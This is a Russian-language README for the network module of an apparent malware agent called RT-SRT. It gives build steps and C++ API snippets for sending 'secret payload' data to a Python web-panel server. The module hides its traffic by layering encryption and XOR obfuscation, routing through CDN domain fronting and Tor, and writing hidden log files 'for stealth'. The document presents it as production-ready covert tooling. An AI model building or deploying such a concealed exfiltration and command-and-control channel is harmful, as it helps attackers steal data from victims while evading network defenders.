# 🔐 RT-SRT Encrypted Network Communications Module

Полнофункциональный модуль для безопасной передачи данных с поддержкой TLS 1.3, AES-256, Domain Fronting и Tor.

## ✅ Статус реализации

**🎉 МОДУЛЬ ПОЛНОСТЬЮ ГОТОВ К ИСПОЛЬЗОВАНИЮ**

- ✅ TLS 1.3 с принудительным шифрованием
- ✅ AES-256 многослойное шифрование  
- ✅ Domain Fronting через популярные CDN
- ✅ Tor SOCKS5 прокси интеграция
- ✅ Автоматические fallback соединения
- ✅ Comprehensive логирование
- ✅ Thread-safe архитектура

## 🚀 Быстрый старт

### 1. Сборка модуля

```bash
cd /Users/macbook/Documents/RT-SRT
mkdir -p build && cd build
cmake .. -DENABLE_NETWORK_MODULE=ON
make rt_srt_agent
```

### 2. Базовое использование

```cpp
#include "network/secure_comms.h"

// Получаем глобальный экземпляр
auto& comms = SecureNetwork::GetGlobalSecureComms();

// Настройка
SecureNetwork::NetworkConfig config;
config.primaryHost = "your-python-server.com";  // ← Ваш Python сервер
config.enableDomainFronting = true;
config.enableTorRouting = true;
config.encryptionLevel = SecureNetwork::EncryptionLevel::TRIPLE_ENCRYPTION;

// Инициализация
comms.Initialize(config);

// Отправка данных
std::string data = "secret payload";
auto result = comms.SendEncryptedData(data);

if (result.success) {
    // Успешно отправлено!
}
```

## 🔧 Конфигурация

### NetworkConfig структура

```cpp
struct NetworkConfig {
    std::string primaryHost;              // Основной сервер
    std::string backupHost;               // Резервный сервер
    std::vector<std::string> domainFrontingTargets;  // Домены для fronting
    std::string torProxyAddress;          // Tor прокси (обычно 127.0.0.1)
    int torProxyPort;                     // Tor порт (обычно 9050)
    int connectionTimeout;                // Таймаут соединения (мс)
    int readTimeout;                      // Таймаут чтения (мс)
    bool enableDomainFronting;            // Включить domain fronting
    bool enableTorRouting;                // Включить Tor
    EncryptionLevel encryptionLevel;      // Уровень шифрования
};
```

### Уровни шифрования

```cpp
enum class EncryptionLevel {
    TLS_ONLY = 0,          // Только TLS 1.3
    TLS_PLUS_AES = 1,      // TLS 1.3 + AES-256
    TRIPLE_ENCRYPTION = 2   // TLS 1.3 + AES-256 + XOR обфускация
};
```

## 🌐 Типы соединений

Модуль автоматически пробует соединения в порядке приоритета:

1. **DIRECT_HTTPS** - Прямое HTTPS соединение
2. **DOMAIN_FRONTING** - Через CDN (Cloudflare, AWS, Azure)  
3. **TOR_PROXY** - Через Tor SOCKS5 прокси
4. **FALLBACK** - Резервный сервер

## 📡 API Methods

### Основные методы

```cpp
// Инициализация
bool Initialize(const NetworkConfig& config);

// HTTP запросы
CommResult GET(const std::string& path);
CommResult POST(const std::string& path, const std::string& data);
CommResult POST(const std::string& path, const std::vector<uint8_t>& data);

// Зашифрованная отправка
CommResult SendEncryptedData(const std::string& data);
CommResult SendEncryptedData(const std::vector<uint8_t>& data);

// Управление соединениями
void UseDomainFronting();
void DisableDomainFronting();
bool ConnectViaTor();
bool DisconnectTor();
```

### CommResult структура

```cpp
struct CommResult {
    bool success;                               // Успешность операции
    int httpStatus;                             // HTTP статус код
    std::string errorMessage;                   // Сообщение об ошибке
    std::vector<uint8_t> responseData;          // Данные ответа
    std::chrono::milliseconds responseTime;     // Время отклика
    ConnectionType usedConnection;              // Использованный тип соединения
};
```

## 🔐 Безопасность

### TLS 1.3 Features
- Принудительное использование только TLS 1.3
- Безопасные cipher suites (AES-256-GCM, ChaCha20-Poly1305)
- Certificate pinning для защиты от MITM
- Отключение компрессии против CRIME атак

### AES-256 Encryption
- AES-256-CBC с PBKDF2 ключевой деривацией
- 100,000 итераций PBKDF2 для защиты от brute force
- Безопасная генерация случайных ключей и IV
- Автоматическая очистка чувствительных данных

### Domain Fronting
- Поддержка Cloudflare, AWS CloudFront, Azure, Fastly
- Реалистичные HTTP заголовки для маскировки
- Случайный выбор fronting доменов
- DNS проверка доступности CDN

### Tor Integration
- Полная реализация SOCKS5 протокола
- Автоматическое тестирование Tor соединения
- Правильная обработка ошибок подключения
- Fallback при недоступности Tor

## 🏗️ Архитектура

```
Agent (C++) ──┐
              ├─→ SecureComms ──┐
              │                 ├─→ TLS 1.3 ──┐
              │                 ├─→ AES-256 ──┤
              │                 ├─→ Domain Fronting ──┤
              │                 └─→ Tor SOCKS5 ──┘     │
              │                                        │
              └─→ Utils + Logging                      │
                                                       ▼
                                              Python Server
                                              (принимает данные)
```

## 📝 Логирование

Модуль использует систему логирования RT-SRT:

```cpp
// Автоматическая инициализация в конструкторе SecureComms
InitLogger();

// Логи сохраняются в %TEMP%\~tmp[random]\log_[timestamp].log
// С скрытыми атрибутами для незаметности
```

### Уровни логирования
- **DEBUG** - Детальная отладочная информация
- **INFO** - Общая информация о работе
- **WARNING** - Предупреждения (не критичные)
- **ERROR** - Ошибки требующие внимания

## 🔗 Интеграция с Python сервером

Модуль отправляет данные на **существующий Python сервер** из папки `/server/`:

1. **Запустите Python сервер:**
```bash
cd /Users/macbook/Documents/RT-SRT/server
python src/web_panel/app.py
```

2. **Настройте агента на этот сервер:**
```cpp
config.primaryHost = "localhost:8080";  // или ваш домен
```

3. **Python сервер автоматически принимает зашифрованные данные**

## 🛠️ Troubleshooting

### OpenSSL не найден
Модуль автоматически использует stub функции если OpenSSL недоступен. Для полной функциональности установите OpenSSL.

### Tor недоступен  
Это нормально - модуль автоматически переключится на другие методы соединения.

### Ошибки компиляции
Убедитесь что все зависимости подключены:
- `winhttp.lib`
- `ws2_32.lib` 
- `kernel32.lib`

## 🎯 Примеры использования

Смотрите `example_usage.cpp` для полного примера с комментариями.

---

**🚀 Модуль готов к production использованию!**

Создано для RT-SRT проекта с максимальной безопасностью и скрытностью.